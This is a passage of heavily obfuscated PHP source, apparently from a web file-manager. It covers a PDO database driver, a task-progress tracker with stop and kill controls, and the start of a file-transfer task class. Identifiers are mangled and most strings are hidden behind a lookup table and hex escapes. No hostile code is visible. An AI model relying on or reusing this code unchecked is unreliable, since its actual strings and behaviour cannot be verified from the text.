$»‰°ÁŞ¼[992]))) { think_exception($»‰°ÁŞ¼[993] . $this->dbType . $»‰°ÁŞ¼[994] . $this->dbType . $»‰°ÁŞ¼[995]); } if (!$this->linkID[$ÍÓ”¦è]) { think_exception($»‰°ÁŞ¼[996]); } try { $this->linkID[$ÍÓ”¦è]->exec($»‰°ÁŞ¼[997] . think_config($»‰°ÁŞ¼[963])); } catch (Exception $ù›¹¯êµ) { } $this->connected = !0; if (1 != think_config($»‰°ÁŞ¼[22])) { unset($this->config); } } return $this->linkID[$ÍÓ”¦è]; } public function free() { $this->PDOStatement = null; } public function query($ë¤¯ø²í, $½“ø£¬” = array()) { $Õ©ıÆÕ =& $_SERVER[äô®•½Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ë¤¯ø²í; if (!empty($½“ø£¬”)) { $this->queryStr .= $Õ©ıÆÕ[998] . print_r($½“ø£¬”, !0) . $Õ©ıÆÕ[999]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Õ©ıÆÕ[23], 1); think_status($Õ©ıÆÕ[24]); $this->PDOStatement = $this->_linkID->prepare($ë¤¯ø²í); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‘ˆÆ±ğú = $this->PDOStatement->execute($½“ø£¬”); $this->debug(); if (!1 === $‘ˆÆ±ğú) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ğûâ¥İ›, $šíóŒ¿› = array()) { $š»°§ßü =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğûâ¥İ›; if (!empty($šíóŒ¿›)) { $this->queryStr .= $š»°§ßü[998] . print_r($šíóŒ¿›, !0) . $š»°§ßü[999]; } $Ú×ºš = !1; if ($this->dbType == $š»°§ßü[992]) { if (preg_match($š»°§ßü[1000], $this->queryStr, $½·…úØ‰)) { $this->table = think_config($š»°§ßü[1001]) . str_ireplace(think_config($š»°§ßü[1002]), $š»°§ßü[465], $½·…úØ‰[2]); $Ú×ºš = (bool) $this->query($š»°§ßü[1003] . strtoupper($this->table) . $š»°§ßü[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($š»°§ßü[25], 1); think_status($š»°§ßü[24]); $this->PDOStatement = $this->_linkID->prepare($ğûâ¥İ›); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $İšşãá = $this->PDOStatement->execute($šíóŒ¿›); $this->debug(); if (!1 === $İšşãá) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ú×ºš || preg_match($š»°§ßü[1004], $ğûâ¥İ›)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ı™¤¡³ô = $this->_linkID->commit(); $this->transTimes = 0; if (!$ı™¤¡³ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ä»ı¤“« = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ä»ı¤“«) { $this->error(); return !1; } } return !0; } private function getAll() { $ºı³ğ¸ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ºı³ğ¸); return $ºı³ğ¸; } public function getFields($ˆÎ†Š¸) { $ÙÔÅ¦€ =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (think_config($ÙÔÅ¦€[1005])) { $…ÚÓ¿îÇ = str_replace($ÙÔÅ¦€[1006], $ˆÎ†Š¸, think_config($ÙÔÅ¦€[1005])); } else { switch ($this->dbType) { case $ÙÔÅ¦€[989]: case $ÙÔÅ¦€[1007]: $…ÚÓ¿îÇ = "\123\105\114\x45\103\x54\40\40\40\x63\157\x6c\x75\x6d\x6e\137\156\141\155\x65\x20\x61\x73\40\x27\116\141\x6d\145\x27\x2c\40\40\40\x64\141\x74\141\x5f\164\x79\160\x65\40\x61\163\x20\47\124\171\x70\x65\x27\x2c\x20\x20\x20\143\157\x6c\165\x6d\x6e\137\144\145\x66\x61\165\154\164\40\x61\x73\40\x27\104\x65\x66\x61\165\x6c\x74\x27\x2c\x20\40\x20\151\x73\x5f\x6e\x75\154\x6c\x61\x62\x6c\145\40\x61\163\40\x27\x4e\165\x6c\154\x27\12\x9\x9\x46\122\117\115\x9\151\x6e\146\x6f\x72\x6d\141\x74\x69\157\156\x5f\163\x63\x68\x65\155\x61\x2e\164\x61\x62\x6c\x65\x73\40\101\x53\x20\x74\xa\11\11\x4a\x4f\x49\116\11\151\156\146\x6f\162\x6d\141\x74\x69\157\x6e\x5f\163\143\x68\x65\x6d\x61\56\x63\x6f\x6c\165\155\156\x73\x20\x41\123\x20\x63\12\11\x9\117\116\x20\40\x74\x2e\164\x61\x62\x6c\x65\137\143\x61\164\141\154\157\147\x20\x3d\40\143\56\x74\141\x62\154\145\137\x63\x61\164\141\x6c\x6f\x67\12\x9\x9\x41\116\x44\x20\x74\56\164\141\142\154\145\137\163\x63\150\x65\155\x61\40\x3d\x20\143\56\164\141\142\x6c\x65\x5f\163\143\x68\x65\x6d\141\xa\x9\x9\101\116\104\40\164\x2e\164\x61\x62\x6c\x65\137\x6e\141\x6d\145\x20\75\x20\143\56\164\141\x62\154\x65\x5f\x6e\x61\x6d\x65\xa\11\x9\127\110\x45\122\105\40\x20\x20\x74\56\164\x61\142\x6c\145\137\x6e\141\x6d\145\x20\75\40\x27{$ˆÎ†Š¸}\47"; break; case $ÙÔÅ¦€[1008]: $…ÚÓ¿îÇ = $ÙÔÅ¦€[1009] . $ˆÎ†Š¸ . $ÙÔÅ¦€[1010]; break; case $ÙÔÅ¦€[990]: case $ÙÔÅ¦€[992]: $…ÚÓ¿îÇ = $ÙÔÅ¦€[1011] . $ÙÔÅ¦€[1012] . $ÙÔÅ¦€[1013] . strtoupper($ˆÎ†Š¸) . $ÙÔÅ¦€[1014] . strtoupper($ˆÎ†Š¸) . $ÙÔÅ¦€[1015]; break; case $ÙÔÅ¦€[1016]: $…ÚÓ¿îÇ = $ÙÔÅ¦€[1017] . $ˆÎ†Š¸ . $ÙÔÅ¦€[1018]; break; case $ÙÔÅ¦€[991]: break; case $ÙÔÅ¦€[1019]: default: $…ÚÓ¿îÇ = $ÙÔÅ¦€[1020] . ($this->dbType == $ÙÔÅ¦€[1019] ? "\x60{$ˆÎ†Š¸}\140" : $ˆÎ†Š¸); } } $µ•„û…ì = $this->query($…ÚÓ¿îÇ); $Ì›Ò¾Äö = array(); if ($µ•„û…ì) { foreach ($µ•„û…ì as $úÛ¹¯¦® => $í£ğ£ùõ) { $í£ğ£ùõ = array_change_key_case($í£ğ£ùõ); $í£ğ£ùõ[$ÙÔÅ¦€[32]] = isset($í£ğ£ùõ[$ÙÔÅ¦€[32]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[32]] : $ÙÔÅ¦€[465]; $í£ğ£ùõ[$ÙÔÅ¦€[33]] = isset($í£ğ£ùõ[$ÙÔÅ¦€[33]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[33]] : $ÙÔÅ¦€[465]; $³”ĞÁØ = isset($í£ğ£ùõ[$ÙÔÅ¦€[362]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[362]] : $í£ğ£ùõ[$ÙÔÅ¦€[32]]; $Ì›Ò¾Äö[$³”ĞÁØ] = array($ÙÔÅ¦€[32] => $³”ĞÁØ, $ÙÔÅ¦€[33] => $í£ğ£ùõ[$ÙÔÅ¦€[33]], $ÙÔÅ¦€[35] => (bool) (isset($í£ğ£ùõ[$ÙÔÅ¦€[106]]) && $í£ğ£ùõ[$ÙÔÅ¦€[106]] === $ÙÔÅ¦€[12] || isset($í£ğ£ùõ[$ÙÔÅ¦€[35]]) && $í£ğ£ùõ[$ÙÔÅ¦€[35]] === $ÙÔÅ¦€[12]), $ÙÔÅ¦€[37] => isset($í£ğ£ùõ[$ÙÔÅ¦€[37]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[37]] : (isset($í£ğ£ùõ[$ÙÔÅ¦€[56]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[56]] : $ÙÔÅ¦€[465]), $ÙÔÅ¦€[39] => isset($í£ğ£ùõ[$ÙÔÅ¦€[97]]) ? strtolower($í£ğ£ùõ[$ÙÔÅ¦€[97]]) == $ÙÔÅ¦€[41] : (isset($í£ğ£ùõ[$ÙÔÅ¦€[57]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[57]] : !1), $ÙÔÅ¦€[42] => isset($í£ğ£ùõ[$ÙÔÅ¦€[1021]]) ? strtolower($í£ğ£ùõ[$ÙÔÅ¦€[1021]]) == $ÙÔÅ¦€[44] : (isset($í£ğ£ùõ[$ÙÔÅ¦€[97]]) ? $í£ğ£ùõ[$ÙÔÅ¦€[97]] : !1)); } } return $Ì›Ò¾Äö; } public function getTables($ËøŠ„ìñ = '') { $À€şôƒ =& $_SERVER[äô®•½Â]; if (think_config($À€şôƒ[1022])) { $ßô¼şİÅ = str_replace($À€şôƒ[1023], $ËøŠ„ìñ, think_config($À€şôƒ[1022])); } else { switch ($this->dbType) { case $À€şôƒ[990]: case $À€şôƒ[992]: $ßô¼şİÅ = $À€şôƒ[1024]; break; case $À€şôƒ[989]: case $À€şôƒ[1007]: $ßô¼şİÅ = $À€şôƒ[1025]; break; case $À€şôƒ[1016]: $ßô¼şİÅ = $À€şôƒ[1026]; break; case $À€şôƒ[991]: think_exception(think_lang($À€şôƒ[1027]) . $À€şôƒ[1028]); break; case $À€şôƒ[1008]: $ßô¼şİÅ = $À€şôƒ[45] . $À€şôƒ[46] . $À€şôƒ[47]; break; case $À€şôƒ[1019]: default: if (!empty($ËøŠ„ìñ)) { $ßô¼şİÅ = $À€şôƒ[971] . $ËøŠ„ìñ . $À€şôƒ[972]; } else { $ßô¼şİÅ = $À€şôƒ[973]; } } } $ùïÀ²ãÎ = $this->query($ßô¼şİÅ); $Ÿ¨ºÓâ = array(); foreach ($ùïÀ²ãÎ as $™úù¡ => $á©ø€¶¼) { $Ÿ¨ºÓâ[$™úù¡] = current($á©ø€¶¼); } return $Ÿ¨ºÓâ; } protected function parseLimit($§¨ß‚†è) { $¦¥ÁªÂÛ =& $_SERVER[äô®•½Â]; $ˆĞ×ØµÒ = $¦¥ÁªÂÛ[12]; if (!empty($§¨ß‚†è)) { switch ($this->dbType) { case $¦¥ÁªÂÛ[1016]: case $¦¥ÁªÂÛ[1008]: $§¨ß‚†è = explode($¦¥ÁªÂÛ[50], $§¨ß‚†è); if (count($§¨ß‚†è) > 1) { $ˆĞ×ØµÒ .= $¦¥ÁªÂÛ[51] . $§¨ß‚†è[1] . $¦¥ÁªÂÛ[52] . $§¨ß‚†è[0] . $¦¥ÁªÂÛ[53]; } else { $ˆĞ×ØµÒ .= $¦¥ÁªÂÛ[51] . $§¨ß‚†è[0] . $¦¥ÁªÂÛ[53]; } break; case $¦¥ÁªÂÛ[989]: case $¦¥ÁªÂÛ[1007]: break; case $¦¥ÁªÂÛ[991]: break; case $¦¥ÁªÂÛ[990]: case $¦¥ÁªÂÛ[992]: break; case $¦¥ÁªÂÛ[1019]: default: $ˆĞ×ØµÒ .= $¦¥ÁªÂÛ[51] . $§¨ß‚†è . $¦¥ÁªÂÛ[53]; } } return $ˆĞ×ØµÒ; } public function parseKey(&$ÑŠ£ÄĞ, $ò²Ô™‚ = true) { $í‹Û­¶Ê =& $_SERVER[äô®•½Â]; if ($ò²Ô™‚) { $ÑŠ£ÄĞ = $this->parseKeyCheck($ÑŠ£ÄĞ); } if ($this->dbType == $í‹Û­¶Ê[1019]) { if ($ÑŠ£ÄĞ != $í‹Û­¶Ê[223] && !preg_match($í‹Û­¶Ê[983], $ÑŠ£ÄĞ)) { $ÑŠ£ÄĞ = $í‹Û­¶Ê[472] . trim($ÑŠ£ÄĞ, $í‹Û­¶Ê[472]) . $í‹Û­¶Ê[472]; } return $ÑŠ£ÄĞ; } else { return parent::parseKey($ÑŠ£ÄĞ, $ò²Ô™‚); } } public function close() { $this->_linkID = null; } public function error() { $‚‹„Œòå =& $_SERVER[äô®•½Â]; if ($this->PDOStatement) { $ƒ§­ëÊÕ = $this->PDOStatement->errorInfo(); $this->error = $ƒ§­ëÊÕ[1] . $‚‹„Œòå[4] . $ƒ§­ëÊÕ[2]; } else { $this->error = $‚‹„Œòå[12]; } if ($‚‹„Œòå[12] != $this->queryStr) { $this->error .= LNG($‚‹„Œòå[48]) . $this->queryStr; } think_trace($this->error, $‚‹„Œòå[12], $‚‹„Œòå[49]); return $this->error; } public function escapeString($º¾ĞÊš•) { $ø¯ûãıô =& $_SERVER[äô®•½Â]; switch ($this->dbType) { case $ø¯ûãıô[1016]: case $ø¯ûãıô[989]: case $ø¯ûãıô[1007]: case $ø¯ûãıô[1019]: return addslashes($º¾ĞÊš•); case $ø¯ûãıô[991]: case $ø¯ûãıô[1008]: case $ø¯ûãıô[990]: case $ø¯ûãıô[992]: return str_ireplace($ø¯ûãıô[58], $ø¯ûãıô[59], $º¾ĞÊš•); } } protected function parseValue($®¨¡¸¹—) { $Š¡Ñ’İÚ =& $_SERVER[äô®•½Â]; if (is_string($®¨¡¸¹—)) { $²ˆ éØ = strpos($®¨¡¸¹—, $Š¡Ñ’İÚ[4]) === 0 && in_array($®¨¡¸¹—, array_keys($this->bind)); $®¨¡¸¹— = $²ˆ éØ ? $this->escapeString($®¨¡¸¹—) : $Š¡Ñ’İÚ[1029] . $this->escapeString($®¨¡¸¹—) . $Š¡Ñ’İÚ[1029]; } elseif (isset($®¨¡¸¹—[0]) && is_string($®¨¡¸¹—[0]) && strtolower($®¨¡¸¹—[0]) == $Š¡Ñ’İÚ[383]) { $®¨¡¸¹— = $this->escapeString($®¨¡¸¹—[1]); } elseif (is_array($®¨¡¸¹—)) { $®¨¡¸¹— = array_map(array($this, $Š¡Ñ’İÚ[1030]), $®¨¡¸¹—); } elseif (is_bool($®¨¡¸¹—)) { $®¨¡¸¹— = $®¨¡¸¹— ? $Š¡Ñ’İÚ[91] : $Š¡Ñ’İÚ[231]; } elseif (is_null($®¨¡¸¹—)) { $®¨¡¸¹— = $Š¡Ñ’İÚ[106]; } return $®¨¡¸¹—; } public function getLastInsertId() { $Ï‹¤¥¼ =& $_SERVER[äô®•½Â]; switch ($this->dbType) { case $Ï‹¤¥¼[1016]: case $Ï‹¤¥¼[1008]: case $Ï‹¤¥¼[989]: case $Ï‹¤¥¼[1007]: case $Ï‹¤¥¼[991]: case $Ï‹¤¥¼[1019]: return $this->_linkID->lastInsertId(); case $Ï‹¤¥¼[990]: case $Ï‹¤¥¼[992]: $”çÏ–ÜĞ = $this->table; $ñ¬ôş” = $this->query("\123\x45\114\105\103\124\40{$”çÏ–ÜĞ}\56\x63\165\x72\x72\x76\x61\154\x20\x63\x75\x72\162\166\141\154\40\x46\122\117\x4d\40\144\165\141\x6c"); return $ñ¬ôş” ? $ñ¬ôş”[0][$Ï‹¤¥¼[1031]] : 0; } } } goto eøƒÈ¥óÙù; FÆ›°ŞƒÅŞ: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($—Ş§¥½ş, $´‘ñê‚ı = '', $Êİ˜Ş’¨ = 0, $‡¢´¹÷Ü = '') { $¸™Óü´É =& $_SERVER[äô®•½Â]; if (self::get($—Ş§¥½ş)) { return; } $this->task = array($¸™Óü´É[486] => $—Ş§¥½ş, $¸™Óü´É[1777] => USER_ID, $¸™Óü´É[1664] => $‡¢´¹÷Ü, $¸™Óü´É[537] => $¸™Óü´É[12], $¸™Óü´É[33] => $´‘ñê‚ı, $¸™Óü´É[1137] => $¸™Óü´É[12], $¸™Óü´É[1135] => $Êİ˜Ş’¨, $¸™Óü´É[1778] => 0, $¸™Óü´É[1779] => 0, $¸™Óü´É[1780] => 0, $¸™Óü´É[1781] => timeFloat(), $¸™Óü´É[1782] => 0, $¸™Óü´É[1783] => 0, $¸™Óü´É[1784] => 0, $¸™Óü´É[1785] => 0, $¸™Óü´É[815] => $¸™Óü´É[1726]); $GLOBALS[$¸™Óü´É[1786]] = 1; Hook::bind($¸™Óü´É[1730], array($this, $¸™Óü´É[1787])); Hook::bind($¸™Óü´É[1788], array($this, $¸™Óü´É[1789])); $this->startAfter(); Hook::trigger($¸™Óü´É[1790], $this->task); $this->task[$¸™Óü´É[1783]] = timeFloat(); } public function end($ÌÉÓ†èÃ = '') { $´” é× =& $_SERVER[äô®•½Â]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$´” é×[1783]]) { self::valueSet($this->task[$´” é×[486]], !1); } $this->isEnd = !0; if ($ÌÉÓ†èÃ) { $this->task[$´” é×[537]] = $ÌÉÓ†èÃ; } self::log($´” é×[1791] . $this->task[$´” é×[486]] . $´” é×[1792] . sprintf($´” é×[923], timeFloat() - $this->task[$´” é×[1781]]) . $´” é×[1793]); Hook::unbind($´” é×[1730], array($this, $´” é×[1787])); Hook::unbind($´” é×[1788], array($this, $´” é×[1789])); $this->endAfter(); $Øğ÷Õõ“ = $this->task; $this->task = !1; Hook::trigger($´” é×[1794], $Øğ÷Õõ“); } public function update($çèˆ‹ı = 0, $Óëğ¿È© = false) { $ÄÁÅÛ¦Ò =& $_SERVER[äô®•½Â]; $Œ€îş°Í =& $this->task; if (!$Œ€îş°Í) { return; } $Œ€îş°Í[$ÄÁÅÛ¦Ò[1778]] += $çèˆ‹ı; $Œ€îş°Í[$ÄÁÅÛ¦Ò[1782]] = timeFloat(); if ($Œ€îş°Í[$ÄÁÅÛ¦Ò[1135]]) { if ($Œ€îş°Í[$ÄÁÅÛ¦Ò[1135]] < $Œ€îş°Í[$ÄÁÅÛ¦Ò[1778]]) { $Œ€îş°Í[$ÄÁÅÛ¦Ò[1135]] = $Œ€îş°Í[$ÄÁÅÛ¦Ò[1778]]; } $©ÉÛ€â = timeFloat() - $Œ€îş°Í[$ÄÁÅÛ¦Ò[1781]] - $Œ€îş°Í[$ÄÁÅÛ¦Ò[1784]]; if ($©ÉÛ€â <= 0) { $©ÉÛ€â = 0.001; } $Œ€îş°Í[$ÄÁÅÛ¦Ò[1779]] = $Œ€îş°Í[$ÄÁÅÛ¦Ò[1778]] / $Œ€îş°Í[$ÄÁÅÛ¦Ò[1135]]; $Œ€îş°Í[$ÄÁÅÛ¦Ò[1780]] = $Œ€îş°Í[$ÄÁÅÛ¦Ò[1778]] / $©ÉÛ€â; if ($Œ€îş°Í[$ÄÁÅÛ¦Ò[1779]] > 0) { $Œ€îş°Í[$ÄÁÅÛ¦Ò[1785]] = $©ÉÛ€â * (1 - $Œ€îş°Í[$ÄÁÅÛ¦Ò[1779]]) / $Œ€îş°Í[$ÄÁÅÛ¦Ò[1779]]; } $Œ€îş°Í[$ÄÁÅÛ¦Ò[1785]] = $Œ€îş°Í[$ÄÁÅÛ¦Ò[1785]] <= 0 ? 0 : $Œ€îş°Í[$ÄÁÅÛ¦Ò[1785]]; } $this->updateAfter(); $íşãŠò¨ = 0.2; if (timeFloat() - $Œ€îş°Í[$ÄÁÅÛ¦Ò[1783]] < $íşãŠò¨ && !$Óëğ¿È©) { return; } $÷””Â¢ = self::get($Œ€îş°Í[$ÄÁÅÛ¦Ò[486]]); $Ú¸Ä¹Í« = $÷””Â¢[$ÄÁÅÛ¦Ò[815]]; if ($Ú¸Ä¹Í« == self::STATYS_KILL) { $Ã–‘ùó = array($ÄÁÅÛ¦Ò[1795] => LNG($ÄÁÅÛ¦Ò[1796]), $ÄÁÅÛ¦Ò[1295] => !1); Cache::set($ÄÁÅÛ¦Ò[1797] . $this->task[$ÄÁÅÛ¦Ò[486]], $Ã–‘ùó, 30); $this->onKill(); $this->end(); die; } else { if ($Ú¸Ä¹Í« == self::STATYS_STOP) { $ÔÍîŞí› = 2; $÷””Â¢[$ÄÁÅÛ¦Ò[1784]] += $ÔÍîŞí›; self::valueSet($Œ€îş°Í[$ÄÁÅÛ¦Ò[486]], $÷””Â¢); sleep($ÔÍîŞí›); $this->update(); return; } } $Œ€îş°Í[$ÄÁÅÛ¦Ò[815]] = $Ú¸Ä¹Í« ? $Ú¸Ä¹Í« : $Œ€îş°Í[$ÄÁÅÛ¦Ò[815]]; $Œ€îş°Í[$ÄÁÅÛ¦Ò[1784]] = $÷””Â¢[$ÄÁÅÛ¦Ò[1784]] ? $÷””Â¢[$ÄÁÅÛ¦Ò[1784]] : 0; $Œ€îş°Í[$ÄÁÅÛ¦Ò[1783]] = timeFloat(); Hook::trigger($ÄÁÅÛ¦Ò[1798], $Œ€îş°Í); self::valueSet($Œ€îş°Í[$ÄÁÅÛ¦Ò[486]], $Œ€îş°Í); } public function onKillSet($ÖçëÃ»Ô, $üÎÒÅ¨Ô = array()) { $this->onKillCall = array($ÖçëÃ»Ô, $üÎÒÅ¨Ô); } public function onKill() { $–ÕİÄ±ü =& $_SERVER[äô®•½Â]; self::log($–ÕİÄ±ü[1791] . $this->task[$–ÕİÄ±ü[486]] . $–ÕİÄ±ü[1799]); Hook::trigger($–ÕİÄ±ü[1800], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Èš™İÜ×) { $¶¥Âüâ¶ =& $_SERVER[äô®•½Â]; Cache::set($¶¥Âüâ¶[1797] . $this->task[$¶¥Âüâ¶[486]], $Èš™İÜ×, 60); if (!is_array($Èš™İÜ×) || !$Èš™İÜ×[$¶¥Âüâ¶[1295]]) { self::log($¶¥Âüâ¶[1801] . json_encode($Èš™İÜ×)); } return $Èš™İÜ×; } public static function get($¡ĞÛ¢¯) { $ó»–æ›Ú =& $_SERVER[äô®•½Â]; $ÖØ¿şµÓ = self::valueGet($¡ĞÛ¢¯); if (is_array($ÖØ¿şµÓ) && $ÖØ¿şµÓ[$ó»–æ›Ú[1802]]) { $†ÔÙŸ¤² = ActionApply($ÖØ¿şµÓ[$ó»–æ›Ú[1802]], array($ÖØ¿şµÓ)); $ÖØ¿şµÓ = is_array($†ÔÙŸ¤²) ? $†ÔÙŸ¤² : $ÖØ¿şµÓ; } return $ÖØ¿şµÓ; } public static function listData() { $·øØùØÀ = self::valueGet(); return array_sort_by($·øØùØÀ, $_SERVER[äô®•½Â][1781], !0); } public static function kill($ÍÇÀšõ) { return self::changeStatus($ÍÇÀšõ, self::STATYS_KILL); } public static function stop($ãÑòŠ÷Ğ) { return self::changeStatus($ãÑòŠ÷Ğ, self::STATYS_STOP); } public static function restart($Ò³‹ñê¥) { return self::changeStatus($Ò³‹ñê¥, self::STATYS_RUNNING); } public static function killAll() { $´ı¾­ïœ =& $_SERVER[äô®•½Â]; $¾¤İˆã = self::listData(); foreach ($¾¤İˆã as $™Í¿ƒäí) { self::kill($™Í¿ƒäí[$´ı¾­ïœ[486]]); } sleep(2); foreach ($¾¤İˆã as $™Í¿ƒäí) { self::valueSet($™Í¿ƒäí[$´ı¾­ïœ[486]], !1); } } private static function changeStatus($‹şëÆ, $§Ñ³õ®¸) { $‚¯½õ’Ş =& $_SERVER[äô®•½Â]; $‚ÓÉ‘öó = self::valueGet($‹şëÆ); if (!$‚ÓÉ‘öó) { return !1; } $‚ÓÉ‘öó[$‚¯½õ’Ş[815]] = $§Ñ³õ®¸; self::valueSet($‹şëÆ, $‚ÓÉ‘öó); self::log($‚¯½õ’Ş[1803] . $‚ÓÉ‘öó[$‚¯½õ’Ş[486]] . $‚¯½õ’Ş[1804] . $§Ñ³õ®¸); return !0; } public static function valueGet($©ºÄíÌ = false) { $„™Ê‘á€ =& $_SERVER[äô®•½Â]; if ($©ºÄíÌ) { $ßõ·½ûÈ = Model($„™Ê‘á€[531])->where(array($„™Ê‘á€[97] => $©ºÄíÌ, $„™Ê‘á€[33] => $„™Ê‘á€[1144]))->find(); return $ßõ·½ûÈ ? json_decode($ßõ·½ûÈ[$„™Ê‘á€[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÎÌåÒÓ» = false) { $†õ”À“¹ =& $_SERVER[äô®•½Â]; $¾ä¬Ìñ° = array($†õ”À“¹[33] => $†õ”À“¹[1144]); if ($ÎÌåÒÓ») { $¾ä¬Ìñ°[$†õ”À“¹[1777]] = $ÎÌåÒÓ»; } $ıı –åğ = Model($†õ”À“¹[531])->where($¾ä¬Ìñ°)->select(); $ıı –åğ = $ıı –åğ ? $ıı –åğ : array(); foreach ($ıı –åğ as $äéÕ÷¼å => $ÂìÚ§) { $ıı –åğ[$äéÕ÷¼å] = json_decode($ÂìÚ§[$†õ”À“¹[461]], !0); } return $ıı –åğ; } public static function valueSet($Øò‹Æ§¯, $ıêó‹½Ú) { $¤üû¨Â =& $_SERVER[äô®•½Â]; if (!$ıêó‹½Ú) { return Model($¤üû¨Â[531])->where(array($¤üû¨Â[97] => $Øò‹Æ§¯, $¤üû¨Â[33] => $¤üû¨Â[1144]))->delete(); } $¿é¥âÑÑ = json_encode($ıêó‹½Ú); if (!$¿é¥âÑÑ) { ob_start(); var_dump($ıêó‹½Ú); $¢éİ²Û­ = ob_get_clean(); self::log($¤üû¨Â[1805] . json_encode_force($¢éİ²Û­)); } if (!$Øò‹Æ§¯ || !$ıêó‹½Ú[$¤üû¨Â[486]]) { return !1; } $öÔé¬Šñ = array($¤üû¨Â[33] => $¤üû¨Â[1144], $¤üû¨Â[1777] => USER_ID, $¤üû¨Â[97] => $Øò‹Æ§¯, $¤üû¨Â[461] => $¿é¥âÑÑ); $Ø‹ÌÜ¿ = $¤üû¨Â[1806]; CacheLock::lock($Ø‹ÌÜ¿); Model($¤üû¨Â[531])->add($öÔé¬Šñ, array(), !0); CacheLock::unlock($Ø‹ÌÜ¿); } public static function log($—ıœ¥¯’) { if (!GLOBAL_DEBUG) { return; } write_log($—ıœ¥¯’, $_SERVER[äô®•½Â][1807]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Õå¹»Ï =& $_SERVER[äô®•½Â]; $³û§Èô =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Õå¹»Ï[1808], array($this, $Õå¹»Ï[1809])); Hook::bind($Õå¹»Ï[1306], array($this, $Õå¹»Ï[1810])); Hook::bind($Õå¹»Ï[1811], array($this, $Õå¹»Ï[1812])); Hook::bind($Õå¹»Ï[684], array($this, $Õå¹»Ï[1813])); Hook::bind($Õå¹»Ï[685], array($this, $Õå¹»Ï[1814])); Hook::bind($Õå¹»Ï[691], array($this, $Õå¹»Ï[1815])); Hook::bind($Õå¹»Ï[692], array($this, $Õå¹»Ï[1816])); Hook::bind($Õå¹»Ï[687], array($this, $Õå¹»Ï[1817])); Hook::bind($Õå¹»Ï[689], array($this, $Õå¹»Ï[1818])); Hook::bind($Õå¹»Ï[653], array($this, $Õå¹»Ï[1819])); Hook::bind($Õå¹»Ï[650], array($this, $Õå¹»Ï[1819])); Hook::bind($Õå¹»Ï[655], array($this, $Õå¹»Ï[1819])); Hook::bind($Õå¹»Ï[657], array($this, $Õå¹»Ï[1819])); Hook::bind($Õå¹»Ï[659], array($this, $Õå¹»Ï[1819])); Hook::bind($Õå¹»Ï[1820], array($this, $Õå¹»Ï[1821])); Hook::bind($Õå¹»Ï[675], array($this, $Õå¹»Ï[1822])); $this->sourceModelCopyFlag = !1; Hook::bind($Õå¹»Ï[1823], array($this, $Õå¹»Ï[1824])); Hook::bind($Õå¹»Ï[1825], array($this, $Õå¹»Ï[1826])); Hook::bind($Õå¹»Ï[1827], array($this, $Õå¹»Ï[1828])); $³û§Èô[$Õå¹»Ï[1829]] = LNG($Õå¹»Ï[1830]); $³û§Èô[$Õå¹»Ï[1831]] = 0; $³û§Èô[$Õå¹»Ï[1832]] = 0; $³û§Èô[$Õå¹»Ï[1137]] = $Õå¹»Ï[12]; $³û§Èô[$Õå¹»Ï[1833]] = $Õå¹»Ï[12]; $³û§Èô[$Õå¹»Ï[1834]] = 0; $³û§Èô[$Õå¹»Ï[1835]] = 0; $³û§Èô[$Õå¹»Ï[1836]] = 0; if (!$³û§Èô[$Õå¹»Ï[1664]]) { $³û§Èô[$Õå¹»Ï[1664]] = LNG($Õå¹»Ï[1837]); } } protected function endAfter() { $”É•ı¾½ =& $_SERVER[äô®•½Â]; Hook::unbind($”É•ı¾½[1808], array($this, $”É•ı¾½[1809])); Hook::unbind($”É•ı¾½[1306], array($this, $”É•ı¾½[1810])); Hook::unbind($”É•ı¾½[1811], array($this, $”É•ı¾½[1812])); Hook::unbind($”É•ı¾½[684], array($this, $”É•ı¾½[1813])); Hook::unbind($”É•ı¾½[685], array($this, $”É•ı¾½[1814])); Hook::unbind($”É•ı¾½[691], array($this, $”É•ı¾½[1815])); Hook::unbind($”É•ı¾½[692], array($this, $”É•ı¾½[1816])); Hook::unbind($”É•ı¾½[687], array($this, $”É•ı¾½[1817])); Hook::unbind($”É•ı¾½[689], array($this, $”É•ı¾½[1818])); Hook::unbind($”É•ı¾½[653], array($this, $”É•ı¾½[1819])); Hook::unbind($”É•ı¾½[650], array($this, $”É•ı¾½[1819])); Hook::unbind($”É•ı¾½[655], array($this, $”É•ı¾½[1819])); Hook::unbind($”É•ı¾½[657], array($this, $”É•ı¾½[1819])); Hook::unbind($”É•ı¾½[659], array($this, $”É•ı¾½[1819])); Hook::unbind($”É•ı¾½[1820], array($this, $”É•ı¾½[1821])); Hook::unbind($”É•ı¾½[675], array($this, $”É•ı¾½[1822])); Hook::unbind($”É•ı¾½[1823], array($this, 